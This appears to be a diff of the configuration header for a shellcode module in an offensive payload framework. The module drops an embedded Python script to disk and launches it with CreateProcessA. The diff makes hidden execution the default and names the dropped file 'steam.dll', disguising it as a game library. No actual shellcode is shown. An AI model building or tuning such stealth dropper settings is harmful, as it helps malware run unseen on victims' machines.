@@ -3,7 +3,7 @@
 #!info##Shellcode designed for large Python scripts, even those hundreds of kilobytes in size. In theory, it can embed scripts of virtually any size and should still work. When executed, the shellcode creates a file, writes the embedded Python script into it, and launches it using 'CreateProcessA'.
 #!lang##nasm
 #!hiveType##SCode
-#!Var##PYY_hide##False##A parameter that determines whether the CreateProcessA execution will run the code in a visible CMD window or keep it hidden. Accepts "True" or "False"; by default, the execution is hidden.##str
+#!Var##PYY_hide##True##A parameter that determines whether the CreateProcessA execution will run the code in a visible CMD window or keep it hidden. Accepts "True" (hidden) or "False"; by default, the execution is hidden.##str
 #!Var##PYY_fname##steam.dll##Name of the file to which the payload will be saved.##str
 #!payloadSpace##PYY_script##Python script
 
